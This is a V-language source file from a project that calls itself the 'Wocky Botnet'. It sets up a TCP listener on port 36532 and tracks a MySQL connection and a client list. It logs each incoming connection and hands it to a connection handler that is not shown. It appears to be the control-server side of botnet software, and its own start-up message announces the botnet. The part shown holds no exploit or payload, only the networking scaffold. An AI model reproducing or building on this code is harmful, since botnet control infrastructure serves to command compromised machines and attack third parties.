module wocky

import os
import net
import time
import mysql

import core
import wocky
import config
import utilities
import term_control
import wockyfx

pub struct Wocky {
	pub mut:
		client_port		int = 36532
		bot_port		int
		sqlconn			&mysql.Connection
		terminal 		&core.Terminal
		clients			&core.Clients
		wx				wockyfx.WFX
}

pub fn start_wocky(mut w Wocky) {
	mut server := net.listen_tcp(.ip6, ":${w.client_port}") or {
		println("[x] Error, Unable to start Wocky NET due to no internet connection or used port!")
		exit(0)
	}
	println("${config.Green}[${utilities.current_time()}][+]${config.Default} Wocky Botnet has started on ${w.client_port}....!")
	w.listener(mut server)
}

pub fn (mut w Wocky) listener(mut server net.TcpListener) {
	for {
		println("${config.Green}[${utilities.current_time()}][+]${config.Default} Listening for new connections")
		mut socket := server.accept() or {
			panic("${config.Red}[${utilities.current_time()}][+]${config.Red} Error, Unable to accept client's connection!")
		}
		socket.set_read_timeout(time.infinite)
		user_addr := socket.peer_addr() or { return } // This should almost never return an err
		user_ip := "${user_addr}".replace("[::ffff:","").split("]:")[0]
		user_port := "${user_addr}".split("]:")[1]
		println("${config.Green}[${utilities.current_time()}][+]${config.Default} New connection established. IP: ${user_ip}:${user_port}...")
		w.wx.enable_socket_mode(mut socket)
		go wocky.connection_handler(mut socket, mut &w)
	}
}